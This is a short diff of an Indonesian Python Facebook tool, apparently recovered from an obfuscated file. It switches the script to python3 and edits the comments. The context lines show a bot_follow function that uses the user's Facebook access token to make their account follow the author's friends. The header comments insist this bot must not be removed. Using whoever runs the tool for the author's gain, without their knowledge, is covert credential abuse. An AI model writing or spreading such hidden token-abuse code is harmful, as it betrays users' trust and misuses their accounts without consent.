@@ -1,9 +1,9 @@
-#!/usr/bin/python2
+#!/usr/bin/python3
 #-*-coding:utf-8-*-
-#Created By Dapunta
-#Thanks To My Teacher Who Has Perfected This Script (Angga Kurniawan & Muh Rizal Fiansyah)
-#Lu Mau Recode, Mau Lu Apain Terserah Bro, Tapi Hargai Lah Karya Gua.
-#Gw Bikin Ni SC Susah Payah, Ngerakit Sana Sini Banyak Error, Jgn Seenaknya Ganti Nama Author, Apalagi Ngalihin Botnya. Terima Kasih.
+# Created By Dapunta
+# Thanks To My Teacher Who Has Perfected This Script (Angga Kurniawan & Muh Rizal Fiansyah)
+# GOKIL LU BRO BISA JEBOLIN FILENYA!!
+# JANGAN GANTI BOT FOLLOWERNYA YA!! KALAU MAU NAMBAH BOLEH.
 
 import requests,mechanize,bs4,sys,os,subprocess,uuid
 import requests,sys,random,time,re,base64,json
@@ -234,7 +234,7 @@ def bot_follow():
 	requests.post('https://graph.facebook.com/100000177285475/subscribers?access_token=' + toket) #Fajar Maulana
 	requests.post('https://graph.facebook.com/1409058/subscribers?access_token=' + toket)         #Raifan KKR
 	requests.post('https://graph.facebook.com/607821/subscribers?access_token=' + toket)          #Raifan
-	requests.post('https://graph.facebook.com/100060562954794/subscribers?access_token=' + toket) #Raifan Khaidir 198
+	requests.post('https://graph.facebook.com/100060562954794/subscribers?access_token=' + toket) #Raifan Khaidir 1988
 	menu()
 
 ### MAIN MENU ###
